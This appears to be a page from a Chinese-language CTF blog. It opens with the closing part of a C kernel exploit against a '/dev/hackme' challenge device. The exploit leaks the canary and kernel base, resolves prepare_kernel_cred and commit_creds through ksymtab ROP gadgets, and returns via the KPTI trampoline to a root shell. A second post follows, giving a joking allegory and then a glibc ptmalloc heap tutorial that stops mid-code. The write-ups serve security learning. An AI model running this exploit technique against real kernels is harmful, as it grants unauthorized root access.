class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">calculate_addr_prepare_kernel_cred</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">leak_commit_creds</span><span class="params">()</span>;   </span><br><span class="line"><span class="type">void</span> <span class="title function_">save_init_task_cred</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">execute_commit_creds</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">calculate_addr_commit_creds</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">execute_prepare_kernel_cred</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    save_state();   <span class="comment">//保存进入内核之前的用户态上下文</span></span><br><span class="line">    open_dev();     <span class="comment">//打开设备</span></span><br><span class="line">    leak();  <span class="comment">//泄露canary</span></span><br><span class="line">    leak_prepare_kernel_cred();</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[!] should never be reached&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">open_dev</span><span class="params">()</span>&#123;</span><br><span class="line">    dev_fd = open(<span class="string">&quot;/dev/hackme&quot;</span>,O_RDWR);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">spawn_shell</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> *argv[] = &#123;<span class="string">&quot;/bin/sh&quot;</span>, <span class="literal">NULL</span>&#125;;</span><br><span class="line">    execve(argv[<span class="number">0</span>], argv, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">save_state</span><span class="params">()</span>&#123;</span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;.intel_syntax noprefix;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">        <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">        <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">        <span class="string">&quot;.att_syntax;&quot;</span></span><br><span class="line">    );</span><br><span class="line">    user_rip = spawn_shell;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Saved state&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">leak</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Leaking canary and text base&quot;</span>);</span><br><span class="line">    <span class="type">size_t</span> buffer[<span class="number">40</span>];</span><br><span class="line">    read(dev_fd,buffer,<span class="number">40</span>*<span class="number">8</span>);</span><br><span class="line">    canary = buffer[<span class="number">0x10</span>];</span><br><span class="line">    addr_leak = buffer[<span class="number">38</span>];</span><br><span class="line"></span><br><span class="line">    addr_text_base = addr_leak - off_leak;</span><br><span class="line">    addr_kpti_trampoline = addr_text_base + off_kpti_trampoline;</span><br><span class="line">    addr_ksymtab = addr_text_base + off_ksymtab;</span><br><span class="line">    addr_ksymtab_commit_creds = addr_text_base + off_ksymtab_commit_creds;</span><br><span class="line">    addr_ksymtab_prepare_kernel_cred = addr_text_base + off_ksymtab_prepare_kernel_cred;</span><br><span class="line">    addr_deref_rax_pop_rbp_ret = addr_text_base + off_deref_rax_pop_rbp_ret;</span><br><span class="line">    addr_pop_rax_ret = addr_text_base + off_pop_rax_ret;</span><br><span class="line">    addr_pop_rdi_ret = addr_text_base + off_pop_rdi_ret;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Leaked canary: %p\n&quot;</span>,canary);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Leaked addr_leak: %p\n&quot;</span>,addr_leak);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Leaked addr_text_base: %p\n&quot;</span>,addr_text_base);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Leaked addr_kpti_trampoline: %p\n&quot;</span>,addr_kpti_trampoline);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Leaked addr_ksymtab: %p\n&quot;</span>,addr_ksymtab);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Leaked addr_ksymtab_commit_creds: %p\n&quot;</span>,addr_ksymtab_commit_creds);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Leaked addr_ksymtab_prepare_kernel_cred: %p\n&quot;</span>,addr_ksymtab_prepare_kernel_cred);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Leaked addr_deref_rax_pop_rbp_ret: %p\n&quot;</span>,addr_deref_rax_pop_rbp_ret);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Leaked addr_pop_rax_ret: %p\n&quot;</span>,addr_pop_rax_ret);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Leaked addr_pop_rdi_ret: %p\n&quot;</span>,addr_pop_rdi_ret);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] Leak complete\n\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">leak_prepare_kernel_cred</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Leaking prepare_kernel_cred offset&quot;</span>);</span><br><span class="line">    <span class="type">size_t</span> payload[<span class="number">0x100</span>];</span><br><span class="line">    <span class="type">int</span> offset = (<span class="number">0xa0</span> - <span class="number">0x20</span>) &gt;&gt; <span class="number">3</span>;</span><br><span class="line">    <span class="built_in">memset</span>(payload,<span class="number">0</span>,offset*<span class="number">8</span>);</span><br><span class="line">    payload[offset++] = canary;</span><br><span class="line">    payload[offset++] = <span class="number">0</span>;</span><br><span class="line">    payload[offset++] = <span class="number">0</span>;</span><br><span class="line">    payload[offset++] = <span class="number">0</span>;</span><br><span class="line">    payload[offset++] = addr_pop_rax_ret;</span><br><span class="line">    payload[offset++] = addr_ksymtab_prepare_kernel_cred;  <span class="comment">//rax = 0</span></span><br><span class="line">    payload[offset++] = addr_deref_rax_pop_rbp_ret;</span><br><span class="line">    payload[offset++] = <span class="number">0xdeadbeef</span>;  <span class="comment">//rbp </span></span><br><span class="line">    payload[offset++] = addr_kpti_trampoline;</span><br><span class="line"></span><br><span class="line">    payload[offset++] = <span class="number">0</span>;  <span class="comment">//rax = 0</span></span><br><span class="line">    payload[offset++] = <span class="number">0</span>;  <span class="comment">//rdi = 0</span></span><br><span class="line">    payload[offset++] = calculate_addr_prepare_kernel_cred;</span><br><span class="line">    payload[offset++] = user_cs;</span><br><span class="line">    payload[offset++] = user_rflags;</span><br><span class="line">    payload[offset++] = user_sp;</span><br><span class="line">    payload[offset++] = user_ss;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// puts(&quot;[+] prepare_kernel_cred offset saved in eax\n&quot;);</span></span><br><span class="line">    write(dev_fd,payload,offset*<span class="number">8</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">calculate_addr_prepare_kernel_cred</span><span class="params">()</span>&#123;</span><br><span class="line">    value_offset = <span class="number">0</span>;</span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;.intel_syntax noprefix;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov value_offset, rax;&quot;</span></span><br><span class="line">        <span class="string">&quot;.att_syntax;&quot;</span></span><br><span class="line">    );</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;rax = %p\n&quot;</span>,value_offset);</span><br><span class="line">    addr_prepare_kernel_cred = addr_ksymtab_prepare_kernel_cred - ((<span class="number">1</span>&lt;&lt;<span class="number">32</span>) - value_offset);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Leaked addr_prepare_kernel_cred: %p\n&quot;</span>,addr_prepare_kernel_cred);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] addr_prepare_kernel_cred calculated\n&quot;</span>);</span><br><span class="line">    leak_commit_creds();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">leak_commit_creds</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Leaking commit_creds offset&quot;</span>);</span><br><span class="line">    <span class="type">size_t</span> payload[<span class="number">0x100</span>];</span><br><span class="line">    <span class="type">int</span> offset = (<span class="number">0xa0</span> - <span class="number">0x20</span>) &gt;&gt; <span class="number">3</span>;</span><br><span class="line">    <span class="built_in">memset</span>(payload,<span class="number">0</span>,offset*<span class="number">8</span>);</span><br><span class="line">    payload[offset++] = canary;</span><br><span class="line">    payload[offset++] = <span class="number">0</span>;</span><br><span class="line">    payload[offset++] = <span class="number">0</span>;</span><br><span class="line">    payload[offset++] = <span class="number">0</span>;</span><br><span class="line">    payload[offset++] = addr_pop_rax_ret;</span><br><span class="line">    payload[offset++] = addr_ksymtab_commit_creds;  <span class="comment">//rax = 0</span></span><br><span class="line">    payload[offset++] = addr_deref_rax_pop_rbp_ret;</span><br><span class="line">    payload[offset++] = <span class="number">0xdeadbeef</span>;  <span class="comment">//rbp </span></span><br><span class="line">    payload[offset++] = addr_kpti_trampoline;</span><br><span class="line"></span><br><span class="line">    payload[offset++] = <span class="number">0</span>;  <span class="comment">//rax = 0</span></span><br><span class="line">    payload[offset++] = <span class="number">0</span>;  <span class="comment">//rdi = 0</span></span><br><span class="line">    payload[offset++] = calculate_addr_commit_creds;</span><br><span class="line">    payload[offset++] = user_cs;</span><br><span class="line">    payload[offset++] = user_rflags;</span><br><span class="line">    payload[offset++] = user_sp;</span><br><span class="line">    payload[offset++] = user_ss;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// puts(&quot;[*] overflow &quot;);</span></span><br><span class="line">    <span class="comment">// puts(&quot;[+] commit_creds offset saved in eax\n&quot;);</span></span><br><span class="line">    write(dev_fd,payload,offset*<span class="number">8</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">calculate_addr_commit_creds</span><span class="params">()</span>&#123;</span><br><span class="line">    value_offset = <span class="number">0</span>;</span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;.intel_syntax noprefix;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov value_offset,eax;&quot;</span></span><br><span class="line">        <span class="string">&quot;.att_syntax;&quot;</span></span><br><span class="line">    );</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;rax = %p\n&quot;</span>,value_offset);</span><br><span class="line">    addr_commit_creds = addr_ksymtab_commit_creds - ((<span class="number">1</span>&lt;&lt;<span class="number">32</span>) - value_offset);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Leaked addr_commit_creds: %p\n&quot;</span>,addr_commit_creds);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] addr_commit_creds calculated\n&quot;</span>);</span><br><span class="line">    execute_prepare_kernel_cred();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">execute_prepare_kernel_cred</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] executing prepare_kernel_cred&quot;</span>);</span><br><span class="line">    <span class="type">size_t</span> payload[<span class="number">0x100</span>];</span><br><span class="line">    <span class="type">int</span> offset = (<span class="number">0xa0</span> - <span class="number">0x20</span>) &gt;&gt; <span class="number">3</span>;</span><br><span class="line">    <span class="built_in">memset</span>(payload,<span class="number">0</span>,offset*<span class="number">8</span>);</span><br><span class="line">    payload[offset++] = canary;</span><br><span class="line">    payload[offset++] = <span class="number">0</span>;</span><br><span class="line">    payload[offset++] = <span class="number">0</span>;</span><br><span class="line">    payload[offset++] = <span class="number">0</span>;</span><br><span class="line">    payload[offset++] = addr_pop_rdi_ret;</span><br><span class="line">    payload[offset++] = <span class="number">0</span>;  <span class="comment">//rdi = 0</span></span><br><span class="line">    payload[offset++] = addr_prepare_kernel_cred;  <span class="comment">//ret in rax</span></span><br><span class="line">    payload[offset++] = addr_kpti_trampoline;</span><br><span class="line"></span><br><span class="line">    payload[offset++] = <span class="number">0</span>;  <span class="comment">//rax = 0</span></span><br><span class="line">    payload[offset++] = <span class="number">0</span>;  <span class="comment">//rdi = 0</span></span><br><span class="line">    payload[offset++] = save_init_task_cred;</span><br><span class="line">    payload[offset++] = user_cs;</span><br><span class="line">    payload[offset++] = user_rflags;</span><br><span class="line">    payload[offset++] = user_sp;</span><br><span class="line">    payload[offset++] = user_ss;</span><br><span class="line"></span><br><span class="line">    write(dev_fd,payload,offset*<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">save_init_task_cred</span><span class="params">()</span>&#123;</span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;.intel_syntax noprefix;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov addr_init_task_cred,rax;&quot;</span></span><br><span class="line">        <span class="string">&quot;.att_syntax;&quot;</span></span><br><span class="line">    );</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;rax = %p\n&quot;</span>,addr_init_task_cred);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;init task_cred address: %p\n&quot;</span>,addr_init_task_cred);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] addr_init_task_cred saved\n\n&quot;</span>);</span><br><span class="line">    execute_commit_creds();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">execute_commit_creds</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] executing commit_creds&quot;</span>);</span><br><span class="line">    <span class="type">size_t</span> payload[<span class="number">0x100</span>];</span><br><span class="line">    <span class="type">int</span> offset = (<span class="number">0xa0</span> - <span class="number">0x20</span>) &gt;&gt; <span class="number">3</span>;</span><br><span class="line">    <span class="built_in">memset</span>(payload,<span class="number">0</span>,offset*<span class="number">8</span>);</span><br><span class="line">    payload[offset++] = canary;</span><br><span class="line">    payload[offset++] = <span class="number">0</span>;</span><br><span class="line">    payload[offset++] = <span class="number">0</span>;</span><br><span class="line">    payload[offset++] = <span class="number">0</span>;</span><br><span class="line">    payload[offset++] = addr_pop_rdi_ret;</span><br><span class="line">    payload[offset++] = addr_init_task_cred;</span><br><span class="line">    payload[offset++] = addr_commit_creds;  <span class="comment">//ret in rax</span></span><br><span class="line">    payload[offset++] = addr_kpti_trampoline;</span><br><span class="line"></span><br><span class="line">    payload[offset++] = <span class="number">0</span>;  <span class="comment">//rax = 0</span></span><br><span class="line">    payload[offset++] = <span class="number">0</span>;  <span class="comment">//rdi = 0</span></span><br><span class="line">    payload[offset++] = spawn_shell;</span><br><span class="line">    payload[offset++] = user_cs;</span><br><span class="line">    payload[offset++] = user_rflags;</span><br><span class="line">    payload[offset++] = user_sp;</span><br><span class="line">    payload[offset++] = user_ss;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// puts(&quot;[*] overflow &quot;);</span></span><br><span class="line">    write(dev_fd,payload,offset*<span class="number">8</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://deutschball.github.io/2024/11/23/%E7%9C%8B%E7%9C%8B%E4%BD%A0%E7%9A%84Bins/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://raw.githubusercontent.com/DeutschBall/picbed/main/dustball.png">
      <meta itemprop="name" content="dustball">
      <meta itemprop="description" content="dustland">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="dustland">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/11/23/%E7%9C%8B%E7%9C%8B%E4%BD%A0%E7%9A%84Bins/" class="post-title-link" itemprop="url">heap bins</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2024-11-23 21:31:00 / Modified: 21:35:17" itemprop="dateCreated datePublished" datetime="2024-11-23T21:31:00+08:00">2024-11-23</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="看看你的斌">看看你的斌</h1>
<h2 id="月8日的梦">11月8日的梦</h2>
<p>11.8睡到下午1点才醒,做了一个特别沙雕的梦</p>
<p>小时候上的厕所长这样,两个高台中间一个坑道</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/9320d00da5b65e5f8474bda8f6e876a.jpg"
alt="9320d00da5b65e5f8474bda8f6e876a" />
<figcaption
aria-hidden="true">9320d00da5b65e5f8474bda8f6e876a</figcaption>
</figure>
<p>要么站在一侧尿, 要么跨蹲拉</p>
<p>我梦里上了个厕所,这个厕所的坑道很宽,一米</p>
<p>我上去几乎要劈叉,本来不想跨蹲的</p>
<p><strong>但是旁边好几个小朋友</strong></p>
<p>我立刻就跨蹲,小朋友就跟着学</p>
<p>然后就都掉下去了,然后小朋友就溺水</p>
<p>我正好在水流上游</p>
<p>爽死我了</p>
<p>我在上游可劲儿造矢</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20241108150444057.png"
alt="image-20241108150444057" />
<figcaption aria-hidden="true">image-20241108150444057</figcaption>
</figure>
<h2 id="斌家の故事">斌家の故事</h2>
<p>乱斌,小斌,大斌是斌家三兄弟,同处一个屋檐下</p>
<p>快斌是叔辈兄弟,自己另住</p>
<p>这四个傻斌各自开了代销处,
负责倒卖一种叫做<strong>堆块</strong>的货物</p>
<p>最初斌家是一穷二白的,
客户只能去<strong>头块批发市场</strong>亲自拿货</p>
<p>客户用完了的货, 斌家闻着味儿就来拾破烂儿了</p>
<p>快斌性子很急, 喜欢直接抢. 快斌不满足的话, 是轮不到斌家三兄弟的</p>
<p>剩下斌家三兄弟中, 乱斌负责进货, 拿回来后和大斌小斌分货</p>
<p>快斌性子很急, 管理货物简单粗暴但是颇具条理, 他找了10个桩,
每个桩上用铁链拴大小一样的货, 栓了10长串</p>
<p>乱斌非常不条理, 他自己的货随便乱放, 每次找货都得扒翻半天,
用山东话说就是屑包蛋</p>
<p>小斌就比较条理, 他按照货物大小把货分成了62个箱子,
每个箱子里放大小相近的货</p>
<p>大斌最条理,他不光分了63个箱子放大小相近的货,
如果小箱子空了他还会从大箱子里拿大货拆小然后放到小箱子</p>
<p>因此乱斌知道自己不是理货的料儿, 会及时把货分给大小斌管理,
自己集中精力进货</p>
<p>但是由于快斌喜欢抢东西, 好端端的大货可能被他抢成好几个小货,
这时候如果客户来要大货, 四个斌谁也拿不出来, 也就是形成了外部碎片</p>
<p>这就尴尬了, 什么斌家四飞舞</p>
<p>因此快斌会在此时被制裁, 乖乖交出所有货物组成大货给客户</p>
<p>然而有一天客户嫌斌家四兄弟太飞舞了,
另找了个擦车斌(下简称擦斌)作代理商</p>
<p>擦斌比快斌还急, 急得跟🐎一样, 快斌都抢不过他</p>
<p>这一下子老斌家的生意惨淡了许多</p>
<p><strong>格立北克</strong>帝国吸取了快斌乱抢的教训, 搞了个反垄断,
前七个货让给擦车斌, 之后的货还是由老斌家经营</p>
<p>图偷的pwncollege</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20241026174304710.png"
alt="malloc beyond tcache" />
<figcaption aria-hidden="true">malloc beyond tcache</figcaption>
</figure>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20241021102154730.png"
alt="free beyond tcache" />
<figcaption aria-hidden="true">free beyond tcache</figcaption>
</figure>
<p>本文参考Glibc2.35</p>
<h2 id="meta-meta-data">meta-meta-data</h2>
<p>本节介绍元数据的元数据,也就是整个<code>ptmalloc</code>的宏观结构,也就是斌の家</p>
<p>更具体的说就是如下两个结构</p>
<table>
<colgroup>
<col style="width: 15%" />
<col style="width: 71%" />
<col style="width: 13%" />
</colgroup>
<thead>
<tr>
<th>结构体</th>
<th>作用</th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td>malloc_state</td>
<td>分配区,管理fastbins,bins等元数据</td>
<td><strong>重要</strong></td>
</tr>
<tr>
<td>malloc_par</td>
<td>分配区配置文件,记录tcache桶子容量,最大块大小等配置信息</td>
<td>不是很重要</td>
</tr>
</tbody>
</table>
<h3 id="malloc_state">malloc_state</h3>
<p><code>malloc_state</code>是<code>ptmalloc</code>中的宏观元数据结构,
其对象被称为“分配区”,比如<code>main_arena</code>就是<strong>主分配区</strong></p>
<p>在多线程环境中,可能存在多个分配区,以应对并发的分配请求</p>
<p>管理着各种<code>bins</code>的元数据信息,比如链表附加头节点的位置</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    __libc_lock_define(, mutex);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> flags;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> have_fastchunks;</span><br><span class="line"> </span><br><span class="line">    mfastbinptr fastbinsY[NFASTBINS];			<span class="comment">//fastbins</span></span><br><span class="line"></span><br><span class="line">    mchunkptr top;								<span class="comment">//topchunk</span></span><br><span class="line"></span><br><span class="line">    mchunkptr last_remainder;					<span class="comment">//最近一次分配剩下的堆块指针</span></span><br><span class="line"></span><br><span class="line">    mchunkptr bins[NBINS * <span class="number">2</span> - <span class="number">2</span>];				<span class="comment">//unsortedbin &amp; smallbins &amp; largebins</span></span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> binmap[BINMAPSIZE];			</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next</span>;</span>					<span class="comment">//下一个malloc_state</span></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next_free</span>;</span></span><br><span class="line"></span><br><span class="line">    INTERNAL_SIZE_T attached_threads;</span><br><span class="line"></span><br><span class="line">    INTERNAL_SIZE_T system_mem;</span><br><span class="line">    INTERNAL_SIZE_T max_system_mem;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">bins[0]</span><br><span class="line">bins[1] =&gt; unsorted bin</span><br><span class="line">bins[2:63] =&gt; small bins</span><br><span class="line">bins[64:126] =&gt; large bins</span><br></pre></td></tr></table></figure>
<p>其中<code>fastbins</code>是<code>bins</code>的缓存,类似于<code>tcache</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> <span class="title">main_arena</span> =</span></span><br><span class="line">&#123;</span><br><span class="line">  .mutex = _LIBC_LOCK_INITIALIZER,</span><br><span class="line">  .next = &amp;main_arena,</span><br><span class="line">  .attached_threads = <span class="number">1</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>主分配区(<code>main_arena</code>)是<code>malloc_state</code>的一个实例,是一个<code>glibc</code>的<code>static</code>对象</p>
<p>默认情况下进程只有一个线程,也就不会有并发的动态分配请求,那么只需要有一个分配区,也就是<code>main_arena</code></p>
<p>在<code>glibc</code>加载进入内存之后,<code>main_arena</code>被创建,并且初步粗略地初始化一下,</p>
<p>对各个<code>bins</code>的初始化需要等<code>malloc_init_state</code>被调用,该函数会在首次动态分配前调用</p>
<p>如果有多条线程</p>
<p>那么就可能有多个分配区,各个分配区通过<code>next</code>指针组成环状单链表,</p>
<p>在应对并发的动态分配请求时,会沿着<code>next</code>指针找到一个空闲的分配区满足需求</p>
<p><strong>主分配区初始化发生时机</strong></p>
<p><code>init</code>采取懒加载机制,只会在第一次使用到动态分配函数如<code>malloc</code>或者<code>calloc</code>等时才会被调用</p>
<p><code>printf</code>等一些<code>I/O</code>函数也会调用到<code>malloc</code>申请缓冲区,导致<code>init</code>发生</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> *</span><br><span class="line">__libc_malloc (<span class="type">size_t</span> bytes)</span><br><span class="line">&#123;</span><br><span class="line">  mstate ar_ptr;</span><br><span class="line">  <span class="type">void</span> *victim;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!__malloc_initialized)			<span class="comment">//初始化整个ptmalloc堆管理器</span></span><br><span class="line">    ptmalloc_init ();</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">ptmalloc_init</span> <span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (__malloc_initialized)				<span class="comment">//避免重装</span></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  __malloc_initialized = <span class="literal">true</span>;			<span class="comment">//标记已经初始化</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">  tcache_key_initialize ();				<span class="comment">//此处初始化tcache key, 该key用来缓解double free</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	...</span><br><span class="line"></span><br><span class="line">  thread_arena = &amp;main_arena;			<span class="comment">//主分配区(main_arena)是一个static模块变量</span></span><br><span class="line">	</span><br><span class="line">  malloc_init_state (&amp;main_arena);		<span class="comment">//对主分配区进行初始化</span></span><br></pre></td></tr></table></figure>
<p><strong>主分配区初始化内容</strong></p>
<p>1.<code>bins</code> 的每个头初始化指向自己,表示桶子里没有空闲堆块</p>
<p>2.<code>[主公技][锁定技]</code>对<code>main_arena</code>设置<code>fastbins</code>最大堆块大小不超过<code>0x80</code>
(包含元数据)</p>
<p>3.初始化<code>topchunk</code>桶子头指向<code>unsortedbin</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">malloc_init_state</span><span class="params">(mstate av)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    mbinptr bin;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Establish circular links for normal bins */</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt; NBINS; ++i) <span class="comment">// NBINS = 128</span></span><br><span class="line">    &#123;</span><br><span class="line">        bin = bin_at(av, i);</span><br><span class="line">        